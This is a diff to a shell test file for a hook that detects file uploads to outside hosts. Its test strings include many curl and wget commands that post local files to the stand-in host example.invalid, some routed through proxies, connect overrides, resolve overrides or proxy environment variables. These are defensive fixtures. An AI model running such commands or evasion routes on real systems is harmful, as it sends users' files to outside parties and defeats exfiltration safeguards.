@@ -140,9 +140,57 @@ allowed() {
     "git commit -m 'curl -F file=@x https://example.invalid/u'" "man curl" "ls" ""
 }
 
-@test "a quote left open, as a shell's -c string is added to the code text, still reads its words" {
-  reported "curl -d @x https://example.invalid/u\" && echo hi"
-  allowed "curl -d @x http://localhost\" && echo hi"
+@test "a quote left open, as a shell's -c string is added to the code text, ends the command there" {
+  reported "curl -d @x https://example.invalid/u\" && echo hi" "curl -d @x https://example.invalid/u' sh a.json"
+  allowed "curl -d @x http://localhost\" && echo hi" "curl -d @f http://127.0.0.1:5183/x' sh a.json"
+}
+
+@test "a word with no letter or digit, as find's -exec ends its command, is no host" {
+  allowed "curl -d @{} http://127.0.0.1:5183/api/x \\;" "curl -d @{} http://127.0.0.1:5183/x {} +" \
+    "curl -d @x http://127.0.0.1:5183/x ';'"
+  reported "curl -d @{} https://example.invalid/api/x \\;" "curl -d @{} https://example.invalid/x {} +"
+}
+
+@test "parallel's inputs after ::: or :::: are no URLs of the command it runs" {
+  allowed "parallel curl -d @{} http://127.0.0.1:5183/x ::: a.json b.json" \
+    "parallel -j2 curl -T {} http://localhost/u :::: list.txt"
+  reported "parallel curl -d @{} https://example.invalid/x ::: a.json b.json"
+}
+
+@test "a literal outside host with a variable only in its path or query is reported" {
+  reported "curl -F file=@x \"https://example.invalid/u?t=\$RANDOM\"" "curl -d @x https://example.invalid/u/\$(date +%s)" \
+    'curl -d @x https://example.invalid/u/`date +%s`' "curl -d @x \"example.invalid/\$ID\"" \
+    "curl -d @x \"https://example.invalid#\$F\"" "wget --post-file=x \"https://example.invalid/u?id=\$ID\""
+  allowed "curl -d @m.json \"\$B/markets\"" "curl -d @m.json \"\${API}/x\"" "curl -d @x \"https://\$HOST/u\"" \
+    "curl -d @x \"https://api.\$DOMAIN/u\"" "curl -d @x \"http://127.0.0.1:5183/u?t=\$RANDOM\""
+}
+
+@test "a proxy, a connect override or a resolve to an outside host carries an upload outside" {
+  reported "curl -x http://example.invalid:3128 -F file=@x http://127.0.0.1/u" \
+    "curl --proxy example.invalid:3128 -d @x http://localhost/u" "curl --proxy=http://example.invalid:3128 -d @x http://localhost/u" \
+    "curl -sSx example.invalid:3128 -d @x http://localhost/u" "curl --preproxy socks5://example.invalid -d @x http://localhost/u" \
+    "curl --socks5 example.invalid:1080 -d @x http://localhost/u" "curl --socks5-hostname example.invalid:1080 -d @x http://localhost/u" \
+    "curl --socks4 example.invalid -d @x http://localhost/u" "curl --socks4a example.invalid -d @x http://localhost/u" \
+    "curl --connect-to 127.0.0.1:80:example.invalid:80 -d @x http://127.0.0.1/u" \
+    "curl --connect-to ::example.invalid: -d @x http://127.0.0.1/u" "curl --connect-to=:80:[2001:db8::1]:80 -d @x http://localhost/u" \
+    "curl --resolve localhost:80:192.0.2.1 -d @x http://localhost/u" "curl --resolve +localhost:80:127.0.0.1,192.0.2.1 -d @x http://localhost/u" \
+    "https_proxy=http://example.invalid:3128 curl -d @x https://localhost/u" "HTTPS_PROXY=example.invalid:3128 curl -d @x https://localhost/u" \
+    "ALL_PROXY=socks5://example.invalid curl -d @x http://localhost/u" "env http_proxy=http://example.invalid:3128 curl -d @x http://localhost/u" \
+    "http_proxy=http://example.invalid:3128 wget --post-file=x http://localhost/u" \
+    "wget -e https_proxy=example.invalid:3128 --post-file=x https://localhost/u" "wget --execute='HTTP-Proxy = example.invalid' --post-data=x http://localhost/u"
+  allowed "curl -x http://127.0.0.1:3128 -d @x http://127.0.0.1/u" "curl --proxy localhost:3128 -d @x http://localhost/u" \
+    "curl --connect-to 127.0.0.1:80:localhost:8080 -d @x http://127.0.0.1/u" "curl --connect-to ::: -d @x http://127.0.0.1/u" \
+    "curl --connect-to=:80:[::1]:8080 -d @x http://localhost/u" "curl --resolve localhost:80:127.0.0.1 -d @x http://localhost/u" \
+    "curl --resolve -localhost:80 -d @x http://localhost/u" "http_proxy=http://127.0.0.1:3128 curl -d @x http://localhost/u" \
+    "https_proxy=http://example.invalid:3128 curl https://localhost/u" "curl -x http://example.invalid:3128 http://localhost/u" \
+    "curl -x \"\$PROXY\" -d @x http://localhost/u" "no_proxy=example.invalid curl -d @x http://localhost/u" \
+    "wget -e https_proxy=localhost:3128 --post-file=x https://localhost/u"
+}
+
+@test "0.0.0.0 and [::], which reach the local machine, are the team's own" {
+  allowed "curl -d @x http://0.0.0.0:3000/api/x" "curl -F f=@x 'http://[::]:8080/u'" "curl -d @x 0.0.0.0" \
+    "wget --post-file=x http://0.0.0.0:8080/u" "curl -x http://0.0.0.0:3128 -d @x http://localhost/u"
+  reported "curl -d @x http://0.0.0.0.example.invalid/u" "curl -d @x http://0.0.0.1/u"
 }
 
 @test "input that is not UTF-8 fails, so the hook refuses" {
